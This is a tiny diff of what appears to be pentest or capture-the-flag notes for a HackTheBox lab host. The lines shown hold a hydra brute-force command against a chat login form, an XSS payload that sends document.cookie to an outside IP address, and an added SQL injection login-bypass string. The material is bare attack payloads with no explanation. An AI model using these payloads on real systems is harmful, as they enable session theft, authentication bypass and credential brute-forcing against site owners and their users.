@@ -15,3 +15,7 @@ hydra internal-01.bart.htb http-form-post "/simple_chat/login.php:uname=^USER^&p
 
 
 <script> new Image().src="http://10.11.0.222/abra.php?out="+document.cookie;</script>
+
+
+SQLI
+1=1 LIMIT 1;#
